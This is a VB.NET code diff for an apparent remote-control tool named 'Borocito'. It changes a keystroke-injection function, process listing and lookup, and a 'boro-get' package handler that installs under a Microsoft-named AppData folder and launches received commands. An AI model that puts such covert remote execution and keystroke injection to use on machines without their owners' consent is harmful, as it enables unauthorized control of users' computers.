@@ -30,9 +30,11 @@ Module Payloads
     End Sub
     Function SendTheKeys(ByVal proccess As String, ByVal content As String) As String
         Try
-            Dim ProcID As Integer
-            ProcID = Shell(proccess, AppWinStyle.NormalFocus)
-            AppActivate(ProcID)
+            If proccess.ToLower <> "null" Then
+                Dim ProcID As Integer
+                ProcID = Shell(proccess, AppWinStyle.NormalFocus)
+                AppActivate(ProcID)
+            End If
             For Each singleChar As Char In content
                 My.Computer.Keyboard.SendKeys(singleChar, True)
             Next
@@ -247,16 +249,28 @@ Module WindowsActions
             Return AddToLog("ProcessStop@WindowsActions", "Error: " & ex.Message, True)
         End Try
     End Function
-    Function ProcessGet() As String 'Funciona 29/03/2022 17:30
+    Function ProcessGet(Optional ByVal procName As String = Nothing) As String 'Funciona 17/04/2022 09:30
         Try
             Dim retorno As String = Nothing
             retorno = vbCrLf
-            Dim p As Process
-            For Each p In Process.GetProcesses()
-                If Not p Is Nothing Then
-                    retorno = retorno & p.ProcessName & vbCrLf
+            If procName = Nothing Then
+                Dim p As Process
+                For Each p In Process.GetProcesses()
+                    If Not p Is Nothing Then
+                        retorno = retorno & p.ProcessName & " " & p.Id & vbCrLf
+                    End If
+                Next
+            Else
+                Dim sAux() As String = procName.Split("'"c)
+                If sAux.Length = 3 Then
+                    Dim proc = Process.GetProcessesByName(sAux(1))
+                    If proc.Count > 0 Then
+                        retorno = "True (" & proc.Count & ")"
+                    Else
+                        retorno = "False"
+                    End If
                 End If
-            Next
+            End If
             Return retorno
         Catch ex As Exception
             Return AddToLog("ProcessGet@WindowsActions", "Error: " & ex.Message, True)
@@ -377,11 +391,6 @@ Module BOROGET
     Function BORO_GET_ADMIN(ByVal command As String) As String
         Try
             AddToLog("BOROGET", "Processing: " & command, False)
-            'EJEMPLOS
-            '   PACKET boro-get RMTDSK|True|-ServerIP=0.0.0.0 -ServerPort=15243
-            '   INSTALL boro-get install
-            '   UNINSTALL boro-get uninstall
-            '   SET boro-get set boro-get|boro-getPath
             Dim boroGETcommand As String = command.Replace("boro-get", Nothing)
             boroGETcommand = boroGETcommand.TrimStart()
             boroGETcommand = boroGETcommand.TrimEnd()
@@ -407,13 +416,15 @@ Module BOROGET
                 If My.Computer.FileSystem.DirectoryExists("C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-get") Then
                     My.Computer.FileSystem.DeleteDirectory("C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-get", FileIO.DeleteDirectoryOption.DeleteAllContents)
                 End If
+                Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
+                regKey.DeleteSubKeyTree("boro-get")
                 Return "Local repository has been cleared!"
             Else
                 If isBoroGetInstalled() Then
                     'paquete
                     Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
                     Process.Start(regKey.GetValue("boro-get"), boroGETcommand)
-                    Return "Processing Package (" & boroGETcommand & ")"
+                    Return "Processing (" & boroGETcommand & ")"
                 Else
                     Return "boro-get is not installed."
                 End If
